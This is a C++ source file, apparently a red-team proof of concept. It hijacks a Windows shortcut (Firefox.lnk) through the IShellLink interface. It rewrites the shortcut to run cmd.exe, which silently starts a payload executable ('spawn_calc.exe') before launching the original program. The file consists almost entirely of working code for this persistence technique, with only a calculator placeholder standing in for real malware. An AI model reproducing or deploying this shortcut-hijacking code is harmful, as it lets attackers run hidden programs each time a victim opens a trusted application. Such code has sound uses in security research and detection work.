#include <iostream>
#include <ShlObj.h> // Import the IShellLink header
#include <string>
#include <vector>
#include <Windows.h>


using namespace std;


// Function to modify a LNK file using the IShellLink interface
void ModifyLNKFile(const wstring& lnkFile)
{
    // Get the full path to the LNK file
    wstring lnkFilePath = lnkFile;

    // Load the LNK file
    IShellLink* lnk;

    std::cout << "[?] Looking for Firefox.lnk\n";

    HRESULT hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (void**)&lnk);
    if (SUCCEEDED(hr))
    {

        std::cout << "[+] Firefox.lnk found. Collecting Link file properties...\n";
        // Get the original path and arguments of the LNK file
        wchar_t originalPath[MAX_PATH];
        wchar_t originalArguments[MAX_PATH];
        lnk->GetPath(originalPath, MAX_PATH, NULL, SLGP_RAWPATH);
        lnk->GetArguments(originalArguments, MAX_PATH);
        wstring payload =  L"spawn_calc.exe";
       

        // Modify the path and arguments of the LNK file
        std::cout << "[+] Changing Link file path...\n";
        lnk->SetPath(L"cmd.exe");
        wstring newArguments = L"/q /c start " + wstring(payload) + L" && start " + wstring(originalPath);

        std::cout << "[+] Changing Link file arguments...\n";
        lnk->SetArguments(newArguments.c_str());

        

        // Save the modified LNK file
        IPersistFile* persistFile;
        hr = lnk->QueryInterface(IID_IPersistFile, (void**)&persistFile);
        if (SUCCEEDED(hr))
        {
            hr = persistFile->Save(lnkFilePath.c_str(), TRUE);
            persistFile->Release();
            std::cout << "[+] Saving Link file\n";
        }

        lnk->Release();
    }
}

int main()
{
    // Initialize the COM library
    CoInitialize(NULL);

    // Get the name of the LNK file to modify
    wstring lnkFile = L"Firefox.lnk";

    // Modify the LNK file using the IShellLink interface
    ModifyLNKFile(lnkFile);

    // Uninitialize the COM library
    CoUninitialize();
}
